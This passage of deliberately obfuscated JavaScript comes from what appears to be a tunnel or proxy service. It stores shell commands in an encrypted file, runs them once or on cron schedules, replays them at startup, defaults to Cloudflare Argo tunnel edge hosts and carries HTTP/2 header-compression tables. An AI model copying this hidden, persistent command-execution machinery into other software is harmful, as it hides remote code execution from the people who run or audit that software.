    }
    static [a0aY(0x576)](a) {
        const d4 = a0aY, b = {
                'AivrQ': 'hex',
                'yAGkO': function (c, d) {
                    return c === d;
                },
                'ibGpN': d4(0x880)
            };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/['test'](a)) {
                const d = Buffer[d4(0x68c)](a, b[d4(0x13b)]);
                return b[d4(0x75a)](d[d4(0x7a3)], 0x20) ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/[d4(0x731)](a))
                return null;
            const c = Buffer[d4(0x68c)](a, b[d4(0x5be)]);
            return b[d4(0x75a)](c[d4(0x7a3)], 0x20) ? c : null;
        } catch (f) {
            return null;
        }
    }
    static [a0aY(0x8a9)]() {
        const d5 = a0aY, a = {
                'QHews': 'off',
                'LKqHv': d5(0x70a),
                'EkOHA': d5(0x233),
                'WMyuT': d5(0x70d),
                'PVApB': d5(0x23d),
                'JstWx': d5(0x1fa)
            }, b = a0Z[d5(0x5e5)];
        let c = (process.env.KSTORE || '')['trim']();
        if ([
                a[d5(0x284)],
                '0',
                d5(0x8f2),
                a['LKqHv']
            ][d5(0x4f6)](c[d5(0x1a2)]()))
            return a0D['info'](a[d5(0x8e2)]), b;
        const d = (process.env.KSTORE_KEY || '')[d5(0x63e)]();
        !c && (c = a0o['join'](a0Z[d5(0x13d)](), '.tmp', a[d5(0x1dc)]));
        const f = a0Z[d5(0x576)](d);
        if (!f) {
            if (d)
                a0D[d5(0x8e9)](a[d5(0x217)]);
            else
                a0D[d5(0x281)](a[d5(0x8c9)]);
            return b;
        }
        return b['path'] = c, b[d5(0x8d2)] = f, b['enabled'] = !![], a0D['info'](d5(0x673) + b[d5(0x312)]), b;
    }
    static [a0aY(0x367)](a, b) {
        const d6 = a0aY, c = {
                'GXmHj': d6(0x6fb),
                'gYXvt': d6(0x3ef),
                'kYdxH': d6(0x880)
            }, d = a0k[d6(0x3f6)](0xc), f = a0k['createCipheriv'](c[d6(0x357)], a, d), g = Buffer[d6(0x322)]([
                f[d6(0x3cf)](Buffer[d6(0x68c)](b, c['gYXvt'])),
                f[d6(0x215)]()
            ]), h = {
                'nonce': d[d6(0x491)](c[d6(0x44a)]),
                'tag': f['getAuthTag']()[d6(0x491)](c['kYdxH']),
                'ciphertext': g['toString']('base64')
            };
        return Buffer[d6(0x68c)](JSON['stringify'](h), c[d6(0x613)])[d6(0x491)]('base64');
    }
    static [a0aY(0x170)](a, b) {
        const d7 = a0aY, c = {
                'ThndQ': 'utf8',
                'MWxiS': d7(0x6fb),
                'DdJsj': 'base64'
            }, d = JSON[d7(0x7f4)](Buffer[d7(0x68c)](b, d7(0x880))[d7(0x491)](c[d7(0x221)]));
        if (!d[d7(0x6fc)] || !d['tag'] || !d[d7(0x172)])
            throw new Error(d7(0x46d));
        const f = a0k[d7(0x894)](c[d7(0x7d9)], a, Buffer[d7(0x68c)](d[d7(0x6fc)], c[d7(0x8c2)]));
        return f['setAuthTag'](Buffer['from'](d[d7(0x7e8)], c[d7(0x8c2)])), Buffer[d7(0x322)]([
            f[d7(0x3cf)](Buffer[d7(0x68c)](d['ciphertext'], d7(0x880))),
            f[d7(0x215)]()
        ])['toString'](c['ThndQ']);
    }
    static [a0aY(0x733)]() {
        const d8 = a0aY, a = {
                'XJygQ': d8(0x3ef),
                'tPFuB': function (c, d) {
                    return c !== d;
                },
                'YIQzq': d8(0x1f6),
                'JnyFv': function (c, d, f) {
                    return c(d, f);
                },
                'rVCbh': function (c, d) {
                    return c(d);
                }
            }, b = a0Z[d8(0x5e5)];
        if (!b[d8(0x89e)])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
            if (!a0l[d8(0x383)](b[d8(0x312)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l['readFileSync'](b[d8(0x312)], a[d8(0x70f)])[d8(0x63e)]();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON[d8(0x7f4)](a0Z[d8(0x170)](b[d8(0x8d2)], c));
            } catch (j) {
                throw new Error(d8(0x1c3) + j[d8(0x49d)]);
            }
            if (!d || a['tPFuB'](d[d8(0x2b5)], a0Z[d8(0x885)]))
                throw new Error(a[d8(0x50f)]);
            const f = a['JnyFv'](parseInt, d[d8(0x497)], 0xa) || 0x0;
            if (f > a0Z[d8(0x1fe)])
                return b['locked'] = !![], a0D['error'](d8(0x4ba) + f + '\x20高于支持版本\x20' + a0Z[d8(0x1fe)] + ',\x20保留原文件不覆盖,\x20本次以空任务启动且持久化只读'), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a[d8(0x11f)](f, a0Z[d8(0x1fe)]))
                throw new Error(d8(0x540) + f);
            const g = d['data'] || {};
            b['lastSavedAt'] = d[d8(0x552)] || null;
            const h = Array[d8(0x659)](g[d8(0x278)]) ? g[d8(0x278)]['map'](String) : [], i = {};
            for (const [l, m] of Object[d8(0x4b8)](g[d8(0x83c)] || {}))
                i[String(l)] = a[d8(0x15b)](String, m);
            return a0D['info'](d8(0x923) + h[d8(0x7a3)] + ',\x20cron=' + Object[d8(0x84b)](i)[d8(0x7a3)]), {
                'onetasks': h,
                'crontasks': i
            };
        } catch (n) {
            return a0Z['quarantine']('加载失败:\x20' + n[d8(0x49d)]), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static [a0aY(0x251)](a) {
        const d9 = a0aY;
        try {
            const b = a0Z[d9(0x5e5)];
            if (b[d9(0x312)] && a0l[d9(0x383)](b[d9(0x312)])) {
                const c = b['path'] + d9(0x625) + Date[d9(0x855)]();
                a0l[d9(0x5d5)](b['path'], c), a0D['error'](d9(0x59a) + a + ',\x20原文件已隔离:\x20' + c);
            } else
                a0D[d9(0x8e9)](d9(0x59a) + a);
        } catch (d) {
            a0D['error'](d9(0x59a) + a + d9(0x6bf) + d[d9(0x49d)]);
        }
    }
    static [a0aY(0x635)](a, b) {
        const da = a0aY, c = a0Z[da(0x5e5)];
        if (!c[da(0x89e)] || c[da(0x275)])
            return ![];
        let d = null;
        try {
            const f = {
                    'magic': a0Z[da(0x885)],
                    'version': a0Z[da(0x1fe)],
                    'saved_at': new Date()[da(0x907)]()[da(0x655)](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': b || {}
                    }
                }, g = a0Z['encrypt'](c[da(0x8d2)], JSON[da(0x548)](f));
            return a0l['mkdirSync'](a0o['dirname'](c['path']), { 'recursive': !![] }), d = c[da(0x312)] + '.tmp-' + process[da(0x83a)], a0l[da(0x769)](d, g, da(0x3ef)), a0l['renameSync'](d, c[da(0x312)]), c[da(0x45f)] = f[da(0x552)], !![];
        } catch (h) {
            a0D[da(0x8e9)](da(0x680) + h['message']);
            try {
                if (d && a0l['existsSync'](d))
                    a0l['unlinkSync'](d);
            } catch (i) {
            }
            return ![];
        }
    }
}
class a0a0 {
    static [a0aY(0x4b9)] = new Map();
    static [a0aY(0x83f)](a, b) {
        const db = a0aY;
        a[db(0x75e)](b), a[db(0x7a3)] > a0P['MAX_TASK_LOG_SIZE'] && a[db(0x6fa)](0x0, a['length'] - a0P['MAX_TASK_LOG_SIZE']);
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const dc = a0aY, g = new Date()[dc(0x907)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + '\x20----\x20' + a + dc(0x504) + c + '\x0a' + (b?.[dc(0x63e)]() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const dd = a0aY;
        return {
            'status': 'ok',
            'count': a0P[dd(0x278)]['length'],
            'tasks': a0P[dd(0x278)]
        };
    }
    static async [a0aY(0x71f)](a) {
        const de = a0aY, b = {
                'qhtqX': function (d, f) {
                    return d > f;
                },
                'mWEMR': function (d, f) {
                    return d < f;
                },
                'ezPED': de(0x3c5),
                'RUsTk': function (d, f) {
                    return d === f;
                },
                'MdcYe': 'error'
            };
        a0P['onetasks'] = a || [];
        const c = [];
        if (a0P['InitTask'] && b['qhtqX'](a0P[de(0x278)][de(0x7a3)], 0x0)) {
            for (let d = 0x0; b[de(0x872)](d, a0P[de(0x278)]['length']); d++) {
                const f = a0P[de(0x278)][d], g = await a0V['execute'](f), h = this['_formatLogEntry'](f, g['result'], g['exitcode'], b['ezPED']);
                this[de(0x83f)](a0P[de(0x726)], h), c[de(0x75e)]({
                    'index': d,
                    'cmd': f,
                    'exitcode': g[de(0x361)],
                    'output': g[de(0x130)],
                    'status': b[de(0x419)](g[de(0x361)], 0x0) ? 'ok' : b['MdcYe']
                });
            }
            a0P[de(0x34b)] = ![];
        }
        return {
            'status': 'ok',
            'count': a0P[de(0x278)]['length'],
            'tasks': a0P[de(0x278)],
            'executed': c,
            'persisted': a0Z[de(0x635)](a0P['onetasks'], a0P['crontasks'])
        };
    }
    static [a0aY(0x833)]() {
        const df = a0aY;
        return {
            'status': 'ok',
            'count': Object[df(0x84b)](a0P[df(0x83c)])[df(0x7a3)],
            'tasks': a0P['crontasks']
        };
    }
    static [a0aY(0x861)](a) {
        const dg = a0aY, b = {
                'ywbdk': function (d, f) {
                    return d === f;
                },
                'dyoDJ': 'function',
                'zBwaQ': dg(0x8e9),
                'UhKYB': function (d, f) {
                    return d - f;
                }
            };
        this[dg(0x4b9)][dg(0x2ee)](d => {
            const dh = dg;
            b[dh(0x3fe)](typeof d['stop'], b[dh(0x7e5)]) && d['stop'](), typeof d[dh(0x1f0)] === b['dyoDJ'] && d[dh(0x1f0)]();
        }), this[dg(0x4b9)][dg(0x1c7)]();
        const c = [];
        for (const d of Object[dg(0x84b)](a || {})) {
            !a0t[dg(0x7fc)](d) && c[dg(0x75e)](d);
        }
        if (c['length'] > 0x0)
            return {
                'status': b[dg(0x714)],
                'message': dg(0x64b) + c['join'](',\x20'),
                'valid_count': b[dg(0x741)](Object[dg(0x84b)](a || {})['length'], c['length'])
            };
        a0P[dg(0x83c)] = a || {};
        for (const [f, g] of Object['entries'](a0P['crontasks'])) {
            const h = a0t[dg(0x7a2)](f, async () => {
                const di = dg, i = await a0V[di(0x6da)](g), j = this[di(0x362)](g, i[di(0x130)], i[di(0x361)], di(0x790), f);
                this['_appendLog'](a0P['crontasks_log'], j);
            });
            this[dg(0x4b9)][dg(0x50d)](f, h);
        }
        return a0P[dg(0x164)] = Object[dg(0x84b)](a0P[dg(0x83c)])[dg(0x7a3)] > 0x0, {
            'status': 'ok',
            'count': Object[dg(0x84b)](a0P[dg(0x83c)])[dg(0x7a3)],
            'tasks': a0P[dg(0x83c)],
            'persisted': a0Z['save'](a0P[dg(0x278)], a0P['crontasks'])
        };
    }
    static [a0aY(0x3fd)]() {
        const dj = a0aY;
        return {
            'onetime': {
                'pending': a0P['InitTask'],
                'count': a0P[dj(0x278)]['length']
            },
            'cron': {
                'active': a0P[dj(0x164)],
                'count': Object['keys'](a0P['crontasks'])[dj(0x7a3)],
                'check_interval': a0P['CRON_CHECK_INTERVAL']
            },
            'persistence': {
                'enabled': a0Z[dj(0x5e5)]['enabled'],
                'store_path': a0Z[dj(0x5e5)][dj(0x312)],
                'last_saved_at': a0Z[dj(0x5e5)][dj(0x45f)]
            }
        };
    }
    static [a0aY(0x2df)](a = 0x32) {
        const dk = a0aY, b = a0P[dk(0x726)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b[dk(0x7a3)],
            'logs': b
        };
    }
    static [a0aY(0x4ea)](a = 0x32) {
        const dl = a0aY, b = a0P[dl(0x869)][dl(0x489)](-a);
        return {
            'status': 'ok',
            'count': b[dl(0x7a3)],
            'logs': b
        };
    }
    static [a0aY(0x4fe)]() {
        const dm = a0aY, a = a0P['onetimetasks_log'][dm(0x7a3)];
        return a0P[dm(0x726)] = [], {
            'status': 'ok',
            'cleared': dm(0x3c5)
        };
    }
    static ['clearCronLogs']() {
        const dn = a0aY, a = { 'yWrqE': dn(0x790) }, b = a0P[dn(0x869)]['length'];
        return a0P[dn(0x869)] = [], {
            'status': 'ok',
            'cleared': a[dn(0x53c)]
        };
    }
    static ['getLogSummary']() {
        const dp = a0aY, a = {
                'NzomL': function (g, h) {
                    return g - h;
                },
                'IhTid': function (g, h) {
                    return g - h;
                }
            }, b = a0P[dp(0x726)][dp(0x896)](g => g[dp(0x361)] === 0x0)[dp(0x7a3)], c = a[dp(0x615)](a0P[dp(0x726)][dp(0x7a3)], b), d = a0P[dp(0x869)][dp(0x896)](g => g[dp(0x361)] === 0x0)['length'], f = a[dp(0x677)](a0P[dp(0x869)][dp(0x7a3)], d);
        return {
            'onetime': {
                'total_logged': a0P['onetimetasks_log']['length'],
                'max_capacity': a0P['MAX_TASK_LOG_SIZE'],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0P[dp(0x869)][dp(0x7a3)],
                'max_capacity': a0P[dp(0x678)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async ['executeOnetimeTasks']() {
        const dq = a0aY, a = {
                'DUGcC': function (c, d) {
                    return c < d;
                },
                'SXliR': 'onetime'
            }, b = [];
        for (let c = 0x0; a['DUGcC'](c, a0P[dq(0x278)][dq(0x7a3)]); c++) {
            const d = a0P[dq(0x278)][c], f = await a0V[dq(0x6da)](d), g = this[dq(0x362)](d, f[dq(0x130)], f[dq(0x361)], a[dq(0x246)]);
            this[dq(0x83f)](a0P[dq(0x726)], g), b[dq(0x75e)]({
                'cmd': d,
                'exitcode': f[dq(0x361)],
                'output': f[dq(0x130)],
                'timeout': f['timeout']
            });
        }
        return a0P[dq(0x34b)] = ![], {
            'status': 'ok',
            'executed': b[dq(0x7a3)],
            'results': b
        };
    }
    static [a0aY(0x877)]() {
        const dr = a0aY, a = {
                'uiyfv': function (c, d) {
                    return c > d;
                }
            };
        a0Z[dr(0x8a9)]();
        const b = a0Z[dr(0x733)]();
        b[dr(0x278)]['length'] > 0x0 && (a0P[dr(0x278)] = b[dr(0x278)]);
        if (a[dr(0x182)](Object[dr(0x84b)](b[dr(0x83c)])[dr(0x7a3)], 0x0))
            try {
                a0a0['setCronTasks'](b['crontasks']);
            } catch (c) {
                a0D['error'](dr(0x57e) + c[dr(0x49d)]);
            }
        a0P[dr(0x278)][dr(0x7a3)] > 0x0 && a0P['InitTask'] && a0a0['executeOnetimeTasks']()['catch'](d => a0D[dr(0x8e9)]('[TaskStore]\x20❌\x20启动任务恢复执行异常\x20(不影响服务):\x20' + d['message']));
    }
}
const a0a1 = a0aY(0x81c), a0a2 = ((() => {
        const ds = a0aY, a = {
                'eXmIV': function (c, d) {
                    return c > d;
                },
                'SfANE': 'region1.v2.argotunnel.com',
                'iunuP': 'region2.v2.argotunnel.com'
            }, b = String(process.env.KISAMA_EDGE_HOSTS || '')[ds(0x140)](',')[ds(0x575)](c => c[ds(0x63e)]())[ds(0x896)](Boolean);
        return a[ds(0x1bb)](b[ds(0x7a3)], 0x0) ? b : [
            a[ds(0x85c)],
            a[ds(0x7bd)]
        ];
    })()), a0a3 = 0x1ea4, a0a4 = a0aY(0xf9), a0a5 = a0aY(0x2f9), a0a6 = 0x4000, a0a7 = [
        [
            a0aY(0x6db),
            ''
        ],
        [
            a0aY(0x5a9),
            'GET'
        ],
        [
            ':method',
            a0aY(0x63d)
        ],
        [
            a0aY(0x19e),
            '/'
        ],
        [
            ':path',
            a0aY(0x652)
        ],
        [
            ':scheme',
            a0aY(0x502)
        ],
        [
            ':scheme',
            a0aY(0x52d)
        ],
        [
            ':status',
            a0aY(0x1fd)
        ],
        [
            a0aY(0x82f),
            a0aY(0x668)
        ],
        [
            a0aY(0x82f),
            '206'
        ],
        [
            ':status',
            a0aY(0x5aa)
        ],
        [
            a0aY(0x82f),
            a0aY(0x24e)
        ],
        [
            a0aY(0x82f),
            a0aY(0x588)
        ],
        [
            a0aY(0x82f),
            a0aY(0x403)
        ],
        [
            a0aY(0x71a),
            ''
        ],
        [
            'accept-encoding',
            a0aY(0x3a2)
        ],
        [
            a0aY(0x28f),
            ''
        ],
        [
            'accept-ranges',
            ''
        ],
        [
            a0aY(0x4da),
            ''
        ],
        [
            a0aY(0x3f8),
            ''
        ],
        [
            a0aY(0x7a9),
            ''
        ],
        [
            'allow',
            ''
        ],
        [
            a0aY(0x7b8),
            ''
        ],
        [
            'cache-control',
            ''
        ],
        [
            'content-disposition',
            ''
        ],
        [
            a0aY(0x654),
            ''
        ],
        [
            a0aY(0x882),
            ''
        ],
        [
            a0aY(0x31c),
            ''
        ],
        [
            'content-location',
            ''
        ],
        [
            a0aY(0x860),
            ''
        ],
        [
            a0aY(0x228),
            ''
        ],
        [
            a0aY(0x7da),
            ''
        ],
        [
            a0aY(0x301),
            ''
        ],
        [
            a0aY(0x670),
            ''
        ],
        [
            a0aY(0x57a),
            ''
        ],
        [
            a0aY(0x932),
            ''
        ],
        [
            a0aY(0x68c),
            ''
        ],
        [
            'host',
            ''
        ],
        [
            a0aY(0x8de),
            ''
        ],
        [
            'if-modified-since',
            ''
        ],
        [
            a0aY(0x39c),
            ''
        ],
        [
            a0aY(0x1d2),
            ''
        ],
        [
            a0aY(0x37c),
            ''
        ],
        [
            a0aY(0x446),
            ''
        ],
        [
            a0aY(0x8e6),
            ''
        ],
        [
            'location',
            ''
        ],
        [
            'max-forwards',
            ''
        ],
        [
            a0aY(0x81a),
            ''
        ],
        [
            a0aY(0x34e),
            ''
        ],
        [
            a0aY(0x457),
            ''
        ],
        [
            'referer',
            ''
        ],
        [
            'refresh',
            ''
        ],
        [
            a0aY(0x18c),
            ''
        ],
        [
            a0aY(0x407),
            ''
        ],
        [
            a0aY(0x3e5),
            ''
        ],
        [
            a0aY(0x628),
            ''
        ],
        [
            'transfer-encoding',
            ''
        ],
        [
            a0aY(0x192),
            ''
        ],
        [
            a0aY(0x6ab),
            ''
        ],
        [
            a0aY(0x758),
            ''
        ],
        [
            a0aY(0x813),
            ''
        ]
    ], a0a8 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a9 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0aa() {
    const dt = a0aY, a = {
            'BvFwz': function (c, d) {
                return c < d;
            },
            'rUIbG': function (c, d) {
                return c - d;
            },
            'mxscE': function (c, d) {
                return c === d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a[dt(0x3c2)](c, a0a8[dt(0x7a3)]); c++) {
        const d = a0a8[c], f = a0a9[c];
        let g = b;
        for (let h = a[dt(0x14f)](f, 0x1); h >= 0x0; h--) {
            const i = d >> h & 0x1;
            a[dt(0x162)](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                g[0x3] + 0x1
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0ab = a0aa();
function a0ac(a) {
    const du = a0aY, b = {
            'FPPQy': function (h, i) {
                return h >= i;
            },
            'NfeNq': function (h, i) {
                return h & i;
            },
            'tCVnk': function (h, i) {
                return h >> i;
            },
            'eEwAx': function (h, i) {
                return h === i;
            },
            'ajCGK': du(0x823),
            'UDwMs': du(0x12c),
            'MqpjF': function (h, i) {
                return h === i;
            },
            'CYPLr': du(0x4eb),
            'ayLVq': function (h, i) {
                return h > i;
            },
            'DLKxG': function (h, i) {
                return h - i;
            },
            'wKfVJ': function (h, i) {
                return h << i;
            },
            'fgKZq': du(0x30f)
        }, c = [];
    let d = a0ab, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[du(0x80c)](i, 0x0); i--) {
            const j = b[du(0x5f7)](b[du(0x852)](h, i), 0x1);
            f = f << 0x1 | j, g += 0x1, d = d[j];
            if (b[du(0x449)](d, null))
                throw new Error(b[du(0x8f3)]);
            if (b[du(0x80c)](d[0x2], 0x0)) {
                const k = b[du(0x4ee)][du(0x140)]('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        if (b[du(0x771)](d[0x2], 0x100))
                            throw new Error(b[du(0x23e)]);
                        continue;
                    case '1':
                        d = a0ab;
                        continue;
                    case '2':
                        g = 0x0;
                        continue;
                    case '3':
                        c[du(0x75e)](d[0x2]);
                        continue;
                    case '4':
                        f = 0x0;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (b[du(0x53b)](g, 0x7) || f !== b[du(0x126)](b[du(0x747)](0x1, g), 0x1))
        throw new Error(b['fgKZq']);
    return Buffer[du(0x68c)](c);
}
function a0ad(a, b, c) {
    const dv = a0aY, d = {
            'rUesv': function (j, k) {
                return j >= k;
            },
            'IrxZC': function (j, k) {
                return j - k;
            },
            'BSysW': function (j, k) {
                return j << k;
            },
            'oWISk': function (j, k) {
                return j & k;
            },
            'Odamm': function (j, k) {
                return j < k;
            },
            'eiluE': dv(0x47e),
            'JlmhU': function (j, k) {
                return j * k;
            },
            'AAlmH': function (j, k) {
                return j & k;
            },
            'tnnJa': dv(0x4bd)
        };
    if (d[dv(0x375)](b, a[dv(0x7a3)]))
        throw new Error(dv(0x47e));
    const f = a[b];
    b += 0x1;
    const g = d[dv(0x392)](d[dv(0x3a7)](0x1, c), 0x1);
    let h = d[dv(0x52b)](f, g);
    if (d[dv(0x72f)](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (b >= a[dv(0x7a3)])
            throw new Error(d[dv(0x55a)]);
        const j = a[b];
        b += 0x1, h += d[dv(0x5f8)](d['AAlmH'](j, 0x7f), Math[dv(0x1b7)](0x2, i));
        if (d['oWISk'](j, 0x80) === 0x0)
            return [
                h,
                b
            ];
        i += 0x7;
        if (i > 0x1c)
            throw new Error(d[dv(0x667)]);
    }
}
function a0ae(a, b) {
    const dw = a0aY, c = {
            'TogtH': function (j, k) {
                return j >= k;
            },
            'eqvZw': dw(0x4d1),
            'JIzmh': function (j, k) {
                return j & k;
            },
            'pjqoy': function (j, k) {
                return j > k;
            },
            'CpEAU': function (j, k) {
                return j(k);
            }
        };
    if (c[dw(0x6c8)](b, a[dw(0x7a3)]))
        throw new Error(c[dw(0x474)]);
    const d = Boolean(c[dw(0x728)](a[b], 0x80)), [f, g] = a0ad(a, b, 0x7), h = g + f;
    if (c[dw(0x8a4)](h, a[dw(0x7a3)]))
        throw new Error(dw(0x18a));
